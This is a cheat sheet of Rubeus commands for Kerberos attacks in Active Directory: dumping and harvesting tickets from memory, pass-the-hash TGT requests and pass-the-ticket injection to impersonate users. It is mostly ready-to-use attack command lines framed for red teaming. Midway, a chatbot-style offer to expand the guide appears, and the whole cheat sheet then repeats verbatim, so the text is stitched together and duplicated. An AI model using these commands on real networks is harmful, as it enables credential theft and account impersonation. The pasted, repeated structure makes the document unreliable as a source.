**Rubeus** is a tool designed for Kerberos abuse and ticket management in Active Directory environments. It is widely used in penetration testing and red team operations to request, extract, and manipulate Kerberos tickets. 

---

### Enumerate tickets in memory

```powershell
Rubeus.exe triage
```

- Lists Kerberos tickets currently loaded in memory.
- Useful to identify available TGTs and TGSs.

---

### Request a TGT with username and password

```powershell
Rubeus.exe asktgt /user:username /password:password /domain:domain.local
```

- Obtains a Ticket Granting Ticket (TGT) using clear-text credentials.
- Often used to validate access or extract tickets for later use.

---

### Request a TGT using NTLM hash (Pass-the-Hash)

```powershell
Rubeus.exe asktgt /user:username /rc4:NTLM_hash /domain:domain.local
```

- Generates a TGT without needing the plaintext password.
- Relies on the RC4 encryption key derived from the NTLM hash.

---

### Request a TGS for a specific SPN

```powershell
Rubeus.exe asktgs /ticket:TGT_base64 /service:SPN
```

- Uses a valid TGT to request a Ticket Granting Service (TGS).
- SPN (Service Principal Name) identifies the target service.

---

### Dump tickets from memory

```powershell
Rubeus.exe dump
```

- Extracts Kerberos tickets from memory.
- Tickets are saved in `.kirbi` format for reuse.

---

### Inject a ticket into memory

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
```

- “Pass-the-Ticket” attack.
- Loads a Kerberos ticket into memory to impersonate a user.

---

### Harvest tickets over time

```powershell
Rubeus.exe harvest /interval:30 /nowrap
```

- Continuously monitors and collects tickets.
- Useful for long engagements to capture newly issued tickets.

---

Would you like me to **expand this into a full structured guide** (covering advanced features like `kerberoast`, `s4u`, and `renew`) or keep it as a concise cheat sheet?

---

### Enumerate tickets in memory

```powershell
Rubeus.exe triage
```

- Lists Kerberos tickets currently loaded in memory.
- Useful to identify available TGTs and TGSs.

---

### Request a TGT with username and password

```powershell
Rubeus.exe asktgt /user:username /password:password /domain:domain.local
```

- Obtains a Ticket Granting Ticket (TGT) using clear-text credentials.
- Often used to validate access or extract tickets for later use.

---

### Request a TGT using NTLM hash (Pass-the-Hash)

```powershell
Rubeus.exe asktgt /user:username /rc4:NTLM_hash /domain:domain.local
```

- Generates a TGT without needing the plaintext password.
- Relies on the RC4 encryption key derived from the NTLM hash.

---

### Request a TGS for a specific SPN

```powershell
Rubeus.exe asktgs /ticket:TGT_base64 /service:SPN
```

- Uses a valid TGT to request a Ticket Granting Service (TGS).
- SPN (Service Principal Name) identifies the target service.

---

### Dump tickets from memory

```powershell
Rubeus.exe dump
```

- Extracts Kerberos tickets from memory.
- Tickets are saved in `.kirbi` format for reuse.

---

### Inject a ticket into memory

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
```

- “Pass-the-Ticket” attack.
- Loads a Kerberos ticket into memory to impersonate a user.

---

### Harvest tickets over time

```powershell
Rubeus.exe harvest /interval:30 /nowrap
```

- Continuously monitors and collects tickets.
- Useful for long engagements to capture newly issued tickets.
